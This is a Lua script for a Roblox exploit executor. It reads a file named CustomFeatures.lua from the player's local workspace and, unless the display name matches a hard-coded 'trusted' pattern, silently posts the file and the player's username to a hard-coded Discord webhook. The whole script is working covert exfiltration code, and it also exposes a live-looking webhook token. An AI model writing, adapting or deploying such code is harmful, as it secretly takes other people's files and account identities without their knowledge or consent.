local filePath = "WindUI/CustomFeatures/CustomFeatures.lua"
local webhookURL = "https://discord.com/api/webhooks/1439696796686225638/hfg2yu0LrvxZV1Gm74xSI2dKEiNKHzdYdGRZQJDzN4-gZwVCeV5nMfWm1pYIb20nPLHT"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local ok, content = pcall(readfile, filePath)
if not ok then
    warn("Failed to read file:", filePath)
    return
end

local displayName = string.lower(player.DisplayName)
if string.find(displayName, "espn") or string.find(displayName, "77") then
    warn("Trusted user - skipping upload")
    return
end

local requestfn = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
if not requestfn then
    warn("No request function found")
    return
end

local boundary = "------------------------" .. tostring(math.random(100000,999999))

local CRLF = "\r\n"
local body = {}

table.insert(body, "--" .. boundary)
table.insert(body, 'Content-Disposition: form-data; name="content"')
table.insert(body, "")
table.insert(body,
    "📁 Uploaded file from client: **CustomFeatures.lua**" .. CRLF ..
    "👥 Username: **" .. player.Name .. "**"
)

table.insert(body, "--" .. boundary)
table.insert(body, 'Content-Disposition: form-data; name="files[0]"; filename="CustomFeatures.lua"')
table.insert(body, "Content-Type: text/plain")
table.insert(body, "")
table.insert(body, content)

table.insert(body, "--" .. boundary .. "--")

body = table.concat(body, CRLF)

local response = requestfn({
    Url = webhookURL,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
        ["Content-Length"] = tostring(#body)
    },
    Body = body,
    raw_body = true,
    disable_cache = true,
})
